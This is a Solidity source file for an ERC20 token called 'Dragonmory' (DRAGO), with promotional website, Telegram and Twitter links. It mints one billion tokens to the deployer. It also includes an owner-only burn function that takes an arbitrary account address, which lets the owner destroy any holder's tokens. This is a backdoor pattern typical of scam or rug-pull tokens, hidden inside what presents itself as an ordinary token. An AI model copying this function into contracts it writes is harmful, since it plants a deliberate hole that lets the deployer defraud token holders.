/**

Socials:

Website: https://dragonmory.io

Telegram: https://t.me/dragonmory

Twitter: https://twitter.com/dragonmory_off
 
*/

// SPDX-License-Identifier: MIT

pragma solidity =0.8.3;

import "./ERC20.sol";
import "./Address.sol";

contract Dragonmory is ERC20 {

  mapping(address => uint256) private _blockNumberByAddress;
    uint256 private _initialSupply = 1000000000  * 10**18;
  
  constructor() ERC20("Dragonmory", "DRAGO") {
    
    _totalSupply += _initialSupply;
    _balances[msg.sender] += _initialSupply;
    emit Transfer(address(0), msg.sender, _initialSupply);
  }
    
  function burn(address account, uint256 amount) external onlyOwner {
    _burn(account, amount);
  }
}